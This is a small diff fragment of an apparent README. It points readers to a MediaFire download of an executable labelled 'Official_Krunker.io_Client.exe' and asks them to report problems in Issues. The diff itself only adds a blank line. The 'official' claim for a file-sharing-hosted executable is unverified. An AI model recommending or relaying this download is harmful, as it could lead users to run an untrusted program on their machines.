@@ -22,5 +22,6 @@ Click this LINK and Download!
 https://www.mediafire.com/file/offhtbb9g89frem/Official_Krunker.io_Client.exe/file
 __________________________________
 >IF NOT WORK?
+
 please tell me in Issues
 __________________________________
